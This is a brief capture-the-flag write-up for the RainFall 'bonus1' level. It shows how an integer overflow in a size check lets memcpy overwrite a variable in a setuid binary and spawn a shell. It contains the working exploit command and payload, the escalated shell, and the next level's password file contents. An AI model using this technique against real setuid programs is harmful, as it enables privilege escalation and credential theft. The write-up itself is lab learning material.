Once we are logged as bonus1

We are presented with a suid binary.

After analysing the binary it seems that it contains only a main function that spawn a shell for bonus1
But on some condition. Which is we need to overwrite a specific variable to spawn it.

The program first calls atoi function to convert the first argument to integer in order to use it as a size, for the memcpy
that copies the 2nd argument to the local buffer. It would be easier to overwrite the variable but there's a condition that
stop us from doing so which is the 1st argument should be less than or equal to 9.
if (local_14 < 10) {
    memcpy(local_3c,argv[2],local_14 * 4);
    if (local_14 == 0x574f4c46) {
      execl("/bin/sh","sh",0);
    }
    uVar1 = 0;
  }
What we can do is to use the int overflow to increase the size of the memcpy and overwrite the variable with 0x574f4c46.
What we need now is 40bytes + 4bytes(for the 0x574f4c46 address), doing so calculation (-2147483637 * 4 in a int gives us 44)

So writing our payload2

bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c "print 'A'*40 + '\x46\x4c\x4f\x57'")
$ whoami
bonus2
$ cd /home/user/bonus2
$ cat .pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
$

And Here's the flag for bonus2